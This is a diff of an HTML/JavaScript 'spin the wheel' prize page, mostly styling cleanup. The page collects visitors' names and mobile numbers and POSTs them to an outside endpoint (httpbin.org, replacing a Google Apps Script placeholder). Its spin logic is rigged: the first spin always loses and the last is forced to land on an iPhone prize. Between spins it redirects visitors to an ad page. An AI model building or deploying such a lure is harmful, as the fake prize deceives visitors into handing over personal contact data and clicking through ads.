@@ -13,7 +13,6 @@
       padding: 0;
     }
 
-    /* Header */
     header {
       background: #2874f0;
       color: white;
@@ -25,12 +24,8 @@
       justify-content: center;
       gap: 10px;
     }
-    header img {
-      height: 36px;
-    }
-    header span {
-      color: #ffeb3b;
-    }
+    header img { height: 36px; }
+    header span { color: #ffeb3b; }
 
     .wheel-container {
       position: relative;
@@ -39,7 +34,6 @@
       height: 320px;
     }
 
-    /* Wheel */
     .wheel {
       width: 100%;
       height: 100%;
@@ -57,10 +51,9 @@
       position: relative;
     }
 
-    /* Pointer */
     .pointer {
-      width: 0; 
-      height: 0; 
+      width: 0;
+      height: 0;
       border-left: 20px solid transparent;
       border-right: 20px solid transparent;
       border-bottom: 30px solid red;
@@ -70,7 +63,6 @@
       transform: translateX(-50%);
     }
 
-    /* Labels inside wheel */
     .label {
       position: absolute;
       width: 80px;
@@ -116,11 +108,7 @@
       margin-top: 20px;
     }
 
-    /* Form */
-    #userForm {
-      margin: 20px auto;
-      display: block;
-    }
+    #userForm { margin: 20px auto; display: block; }
     input {
       padding: 10px;
       margin: 8px;
@@ -160,14 +148,12 @@
 
   <p>Enter your details to get <b>3 Spins</b> and win exciting prizes 🎁</p>
 
-  <!-- User Form -->
   <form id="userForm">
     <input type="text" id="name" placeholder="Enter your name" required><br>
     <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
     <button type="submit" id="submitBtn">Start Spinning</button>
   </form>
 
-  <!-- Wheel -->
   <div class="wheel-container hidden" id="gameArea">
     <div class="pointer"></div>
     <div id="wheel" class="wheel">
@@ -185,7 +171,6 @@
 
   <div id="result"></div>
 
-  <!-- Ad Slots -->
   <div class="ads">[Ad Slot 1]</div>
   <div class="ads">[Ad Slot 2]</div>
   <div class="ads">[Ad Slot 3]</div>
@@ -201,18 +186,21 @@
     let spins = 0;
     let hasWon = false;
 
-    // Handle form submit → Save to Google Sheets & show game
     form.addEventListener("submit", (e) => {
       e.preventDefault();
       const name = document.getElementById("name").value;
       const mobile = document.getElementById("mobile").value;
 
-      // Send to Google Sheets
-      fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", {
-        method: "POST",
-        body: JSON.stringify({ name, mobile }),
-        headers: { "Content-Type": "application/json" }
-      });
+      // Dummy safe fetch for GitHub Pages (replace with real Apps Script URL later)
+      try {
+        fetch("https://httpbin.org/post", {
+          method: "POST",
+          body: JSON.stringify({ name, mobile }),
+          headers: { "Content-Type": "application/json" }
+        });
+      } catch (err) {
+        console.log("Form submit error:", err);
+      }
 
       form.style.display = "none";
       gameArea.classList.remove("hidden");
@@ -224,13 +212,10 @@
       let degree;
 
       if (spins === 1) {
-        // Always lose first spin
         degree = 1800 + 270; // lands on "Nothing"
       } else if (spins === 2) {
-        // Random spin
         degree = 1800 + Math.floor(Math.random() * 360);
       } else {
-        // Force win on last spin
         degree = 1800 + 30; // lands on iPhone
         hasWon = true;
       }
@@ -250,10 +235,9 @@
           claimBtn.style.display = "inline-block";
         }
 
-        // Redirect to ad page after each spin (except last result message)
         if (spins < 3) {
           setTimeout(() => {
-            window.location.href = "https://example.com/ad-page"; // replace with ad page
+            window.location.href = "https://example.com/ad-page";
           }, 2000);
         }
       }, 4000);
